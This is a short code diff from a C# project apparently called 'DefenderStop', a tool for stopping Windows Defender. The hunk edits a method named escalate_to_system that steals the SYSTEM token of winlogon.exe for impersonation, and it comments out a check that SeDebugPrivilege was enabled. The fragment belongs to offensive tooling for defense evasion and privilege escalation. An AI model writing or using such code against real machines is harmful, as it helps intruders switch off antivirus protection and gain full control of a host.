@@ -266,13 +266,13 @@ namespace DefenderStop
 
         public static void escalate_to_system()
         {
-            //check if SE_DEBUG_Privilege is enabled
-            bool res = EnableDebugPrivilege();
+            //check if SE_DEBUG_Privilege is enabled 
+            /*bool res = EnableDebugPrivilege();
             if (!res)
             {
                 Console.WriteLine("SeDebugPrivilege failed");
                 Environment.Exit(1);
-            }
+            }*/
 
             //impersonate using winlogon.exe SYSTEM token
             Process[] processlist = Process.GetProcesses();
